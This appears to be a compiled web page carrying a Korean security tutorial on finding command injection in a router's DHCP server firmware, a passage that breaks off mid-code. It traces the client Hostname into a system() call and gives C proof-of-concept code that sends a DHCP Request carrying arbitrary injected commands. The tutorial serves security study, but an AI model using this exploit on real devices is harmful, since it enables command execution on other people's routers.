import{_ as d}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as k,d as n,f as p,b as c,t as m,n as _,g as v,w as e,e as a,r as o,o as b}from"./app-BVguHYKu.js";const g={},h={id:"frontmatter-title-관련",tabindex:"-1"},f={class:"header-anchor",href:"#frontmatter-title-관련"},y={class:"table-of-contents"},C={href:"https://github.com/cobyism/edimax-br-6528n/blob/master/boot-source/bootcode_rtl8196c_98/boot/init/dhcpd.c",target:"_blank",rel:"noopener noreferrer"};function w(l,s){const i=o("VPCard"),t=o("router-link"),u=o("SiteInfo"),r=o("VPIcon");return b(),k("div",null,[n("h1",h,[n("a",f,[n("span",null,m(l.$frontmatter.title)+" 관련",1)])]),p(i,_(v({title:"C > Article(s)",desc:"Article(s)",link:"/programming/c/articles/README.md",logo:"https://chanhi2000.github.io/images/ico-wind.svg",background:"rgba(10,10,10,0.2)"})),null,16),n("nav",y,[n("ul",null,[n("li",null,[p(t,{to:"#들어가며"},{default:e(()=>s[0]||(s[0]=[a("들어가며")])),_:1,__:[0]}),n("ul",null,[n("li",null,[p(t,{to:"#분석-환경-및-사용-도구"},{default:e(()=>s[1]||(s[1]=[a("분석 환경 및 사용 도구")])),_:1,__:[1]})]),n("li",null,[p(t,{to:"#분석-절차"},{default:e(()=>s[2]||(s[2]=[a("분석 절차")])),_:1,__:[2]})])])]),n("li",null,[p(t,{to:"#첫-번째-시스템-함수를-사용하는가"},{default:e(()=>s[3]||(s[3]=[a("(첫 번째) 시스템 함수를 사용하는가?")])),_:1,__:[3]})]),n("li",null,[p(t,{to:"#두-번째-시스템-함수의-인자가-동적으로-생성되는가"},{default:e(()=>s[4]||(s[4]=[a("(두 번째) 시스템 함수의 인자가 동적으로 생성되는가?")])),_:1,__:[4]})]),n("li",null,[p(t,{to:"#세-번째-시스템-함수의-인자가-사용자-입력-값에-영향을-받는가"},{default:e(()=>s[5]||(s[5]=[a("(세 번째) 시스템 함수의 인자가 사용자 입력 값에 영향을 받는가?")])),_:1,__:[5]})]),n("li",null,[p(t,{to:"#실습"},{default:e(()=>s[6]||(s[6]=[a("실습")])),_:1,__:[6]}),n("ul",null,[n("li",null,[p(t,{to:"#main-c"},{default:e(()=>s[7]||(s[7]=[a("main.c")])),_:1,__:[7]})]),n("li",null,[p(t,{to:"#dhcp-req-h"},{default:e(()=>s[8]||(s[8]=[a("dhcp_req.h")])),_:1,__:[8]})])])])])]),s[12]||(s[12]=n("hr",null,null,-1)),p(u,{name:"Firmware Command Injection을 알아보자! | NHN Cloud Meetup",desc:"Firmware Command Injection을 알아보자!",url:"https://meetup.nhncloud.com/posts/376",logo:"https://meetup.nhncloud.com/resources/img/favicon.ico",preview:"https://image.toast.com/aaaadh/real/2023/techblog/NHNuD074uB77CuC6B0uB4DC%20MeetupFirmware%20Command%20InjectionuC744%20uC54CuC544uBCF4uC790uC12CuB124uC77C231128.jpg"}),s[13]||(s[13]=c('<figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/NHNuD074uB77CuC6B0uB4DC MeetupFirmware Command InjectionuC744 uC54CuC544uBCF4uC790uC12CuB124uC77C231128.jpg" alt="[NHN클라우드] Meetup!_Firmware Command Injection을 알아보자!" tabindex="0" loading="lazy"><figcaption>[NHN클라우드] Meetup!_Firmware Command Injection을 알아보자!</figcaption></figure><hr><h2 id="들어가며" tabindex="-1"><a class="header-anchor" href="#들어가며"><span>들어가며</span></a></h2><p>오늘날 IoT(Internet of Things, 사물인터넷)는 실생활에서 많은 편리함을 제공하고 있습니다. 사람이 물리적으로 있을 수 없는 곳에서 우리의 눈과 귀를 대신하도록 프로그래밍된 컴퓨터가 모든 데이터를 수집하고 활용하여 우리에게 제공해 줍니다.</p><p>하지만 이와 반대되는 경우도 있습니다. 우리에게 편리함을 주는 기기가 어떻게 반대로 사용될 수 있는지 분석 방법을 알아보고 이를 실습해 보려고 합니다.</p><h3 id="분석-환경-및-사용-도구" tabindex="-1"><a class="header-anchor" href="#분석-환경-및-사용-도구"><span>분석 환경 및 사용 도구</span></a></h3><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/table1uB300uC9C0 1.png" alt="※ FMK(firmware-mod-kit)로 공유기의 펌웨어를 추출 및 분석했다는 전제하에 본문 실습을 진행하였습니다." tabindex="0" loading="lazy"><figcaption><strong>※ FMK(firmware-mod-kit)로 공유기의 펌웨어를 추출 및 분석했다는 전제하에 본문 실습을 진행하였습니다.</strong></figcaption></figure><h3 id="분석-절차" tabindex="-1"><a class="header-anchor" href="#분석-절차"><span>분석 절차</span></a></h3><p>Firmware Command Injection은 다음과 같은 조건을 만족해야 합니다.</p><ul><li>시스템 함수를 사용하는가?</li><li>시스템 함수의 인자가 동적으로 생성되는가?</li><li>시스템 함수의 인자가 사용자 입력 값에 영향을 받는가?</li></ul><hr><h2 id="첫-번째-시스템-함수를-사용하는가" tabindex="-1"><a class="header-anchor" href="#첫-번째-시스템-함수를-사용하는가"><span>(첫 번째) 시스템 함수를 사용하는가?</span></a></h2><p>Grep 명령어를 통해 system 문자열을 검색합니다. System 함수를 사용 중이면 ELF 헤더에 문자열로 기록됩니다. 따라서 system 문자열 검색을 통해 system 함수를 사용 중인 바이너리를 탐색할 수 있습니다. 검색된 바이너리 중 dhcpd 바이너리를 분석하려고 합니다.</p><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci1(1).png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ul><li>dhcpd 바이너리를 IDA로 디스어셈블링한 후 system 문자열을 검색합니다. sendACK 함수에서 System함수를 호출하고 있는 것을 확인할 수 있습니다.</li></ul><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci2.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><hr><h2 id="두-번째-시스템-함수의-인자가-동적으로-생성되는가" tabindex="-1"><a class="header-anchor" href="#두-번째-시스템-함수의-인자가-동적으로-생성되는가"><span>(두 번째) 시스템 함수의 인자가 동적으로 생성되는가?</span></a></h2><p>sendACK 함수에서 System 함수를 사용하는 블록을 확인할 수 있습니다.</p><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci3.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ul><li>해당 블록의 코드에서 <code>sprint</code> 함수에 의해 동적으로 생성되는 인자가 System 함수에 전달되는 것을 확인할 수 있습니다.</li><li><code>sprint</code> 함수에 동적 문자열과 동적 정수가 전달되며, 동적 문자열은 <code>$S1</code> 레지스터에 저장되어 있으므로 상위 코드에서 연산 후 생성된 값이라는 것을 추측할 수 있습니다.</li></ul><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/table2uB300uC9C0 1.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><hr><h2 id="세-번째-시스템-함수의-인자가-사용자-입력-값에-영향을-받는가" tabindex="-1"><a class="header-anchor" href="#세-번째-시스템-함수의-인자가-사용자-입력-값에-영향을-받는가"><span>(세 번째) 시스템 함수의 인자가 사용자 입력 값에 영향을 받는가?</span></a></h2><p>앞의 과정에서 <code>sprintf</code> 함수의 문자열 인자가 상위 코드에서 연산 후 생성된 값이라는 것을 추측하였습니다. 값이 레지스터에 존재한다는 것은 연산 과정을 거쳤다는 뜻입니다. 해당 인자를 역추적하여 생성되는 과정을 분석한 결과 <code>sprintf</code> 함수의 문자열 인자는 <code>get_option</code> 함수의 리턴 값이라는 것을 확인하였습니다.</p><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci4.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',26)),n("ul",null,[s[11]||(s[11]=n("li",null,[n("code",null,"dhcpd"),a("는 오픈소스이므로 "),n("code",null,"get_option"),a(" 함수의 소스 코드를 인터넷에서 찾아볼 수 있습니다. "),n("code",null,"get_option"),a(" 함수는 "),n("code",null,"dhcp_message"),a(" 구조체의 DHCP 옵션 정보를 구하는 함수입니다.")],-1)),n("li",null,[s[10]||(s[10]=a("dhcpd URL: ")),n("a",C,[p(r,{icon:"iconfont icon-github"}),s[9]||(s[9]=a("https://github.com/cobyism/edimax-br-6528n/blob/master/boot-source/bootcode_rtl8196c_98/boot/init/dhcpd.c"))])])]),s[14]||(s[14]=c(`<figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci5.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ul><li><code>get_option</code> 함수의 첫 번째 인자는 <code>dhcp_message</code> 구조체의 포인터이고, 두 번째 인자는 옵션 코드입니다. 해당 블록에서는 <code>0x0C</code>를 전달하며, <code>0x0c</code>는 Client의 Hostname을 의미합니다.</li><li>즉 <code>get_option</code> 함수의 리턴 값은 Client의 Hostname의 주소입니다. 결국 <code>system</code> 함수의 인자는 Client의 Hostname이 동적으로 삽입됩니다.</li></ul><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci6.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ul><li>SendACK라는 함수 이름으로 미루어 보아 DHCP ACK를 보내는 함수로 추측됩니다.</li><li>DHCP Request 패킷의 Hostname을 조작하면 command Injection 공격이 가능할 것이라 추측됩니다.</li></ul><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci7uB300uC9C0 1.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><hr><h2 id="실습" tabindex="-1"><a class="header-anchor" href="#실습"><span>실습</span></a></h2><p>DHCP Request 패킷의 Hostname 조작을 위해 간단한 프로그램을 제작하였습니다. (Python의 scapy 라이브러리를 통해 직접 구현해 보는걸 추천합니다.)</p><h3 id="main-c" tabindex="-1"><a class="header-anchor" href="#main-c"><span><code>main.c</code></span></a></h3><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h&gt;</span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;winSock2.h&gt;</span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;IPHlpApi.h&gt;</span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&quot;dhcp_req.h&quot;</span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">&quot;iphlpapi.lib&quot;</span><span class="token expression"><span class="token punctuation">)</span></span></span></span>
<span class="line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">&quot;ws2_32.lib&quot;</span><span class="token expression"><span class="token punctuation">)</span></span></span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">error_handling</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_boost_custom</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">,</span> <span class="token keyword">int</span> boost_custom_size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_mac_address</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_ip_address</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_injection_code</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> injection_code<span class="token punctuation">,</span> <span class="token keyword">int</span> injection_code_size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    WSADATA wsa_data<span class="token punctuation">;</span></span>
<span class="line">    SOCKET send_sock<span class="token punctuation">;</span></span>
<span class="line">    SOCKADDR_IN send_addr<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> boost_custom_o<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>boost_custom_o<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">short</span> dhcp_port <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">{</span></span>
<span class="line">        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Usage : %s&lt;DHCP Server IP address&gt;&lt;Injection Code&gt;&quot;</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WSAStartup</span><span class="token punctuation">(</span><span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsa_data<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token function">error_handling</span><span class="token punctuation">(</span><span class="token string">&quot;WSA startup error!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    send_sock <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>PF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>send_sock <span class="token operator">==</span> INVALID_SOCKET<span class="token punctuation">)</span></span>
<span class="line">        <span class="token function">error_handling</span><span class="token punctuation">(</span><span class="token string">&quot;socket error!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>send_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>send_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    send_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span></span>
<span class="line">    send_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    send_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>dhcp_port<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>send_sock<span class="token punctuation">,</span> <span class="token punctuation">(</span>SOCKADDR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>send_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>send_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> SOCKET_ERROR<span class="token punctuation">)</span></span>
<span class="line">        <span class="token function">error_handling</span><span class="token punctuation">(</span><span class="token string">&quot;connect error!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token function">set_boost_custom</span><span class="token punctuation">(</span>boost_custom_ptr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>boost_custom_o<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">set_mac_address</span><span class="token punctuation">(</span>boost_custom_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">set_ip_address</span><span class="token punctuation">(</span>boost_custom_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">set_injection_code</span><span class="token punctuation">(</span>boost_custom_ptr<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">send</span><span class="token punctuation">(</span>send_sock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>boost_custom_o<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>boost_custom_o<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">error_handling</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> message<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">fputs</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_boost_custom</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_p<span class="token punctuation">,</span> <span class="token keyword">int</span> boost_custom_size<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">memset</span><span class="token punctuation">(</span>boost_custom_p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> boost_custom_size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Message_type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Hardware_type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Hardware_address_length <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Hops <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Transaction_ID <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token number">0x5a4f1782</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Seconds_elapsed <span class="token operator">=</span> <span class="token number">0x0000</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Bootp_flags <span class="token operator">=</span> <span class="token number">0x0000</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Client_IP_address <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Your_client_IP_address <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Next_server_IP_address <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Relay_agent_IP_address <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Magic_cookie <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token number">0x63825363</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Option_type32 <span class="token operator">=</span> <span class="token number">0x35</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Option_length32 <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>DHCP_Request32 <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Option_type61 <span class="token operator">=</span> <span class="token number">0x3d</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Option_length61 <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>Hardware_type_Ethernet61 <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_type50 <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_length50 <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_type12 <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_length12 <span class="token operator">=</span> NAMESIZE<span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_type81 <span class="token operator">=</span> <span class="token number">0x51</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_length81 <span class="token operator">=</span> <span class="token number">0x03</span> <span class="token operator">+</span> NAMESIZE<span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>flags81 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>a_rr_result81 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>ptr_rr_result81 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_type60 <span class="token operator">=</span> <span class="token number">0x3c</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_length60 <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4d</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x53</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x46</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x54</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x35</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2e</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>vendor_class_identifier_msft60<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x30</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option255 <span class="token operator">=</span> <span class="token number">0xff</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_type55 <span class="token operator">=</span> <span class="token number">0x37</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>option_length55 <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_1_subnet_mask <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_3_router <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_6_domain_name_server <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_15_domain_name <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_31_perform_router_discover <span class="token operator">=</span> <span class="token number">0x1f</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_33_static_route <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_43_vendor_specific_information <span class="token operator">=</span> <span class="token number">0x2b</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_44_netbios_over_tcp_ip_name_server <span class="token operator">=</span> <span class="token number">0x2c</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_46_netbios_over_tcp_ip_node_type <span class="token operator">=</span> <span class="token number">0x2e</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_47_netbios_over_tcp_ip_scope <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_121_classless_static_route <span class="token operator">=</span> <span class="token number">0x79</span><span class="token punctuation">;</span></span>
<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_249_private_classless_static_route_microsoft <span class="token operator">=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span></span>
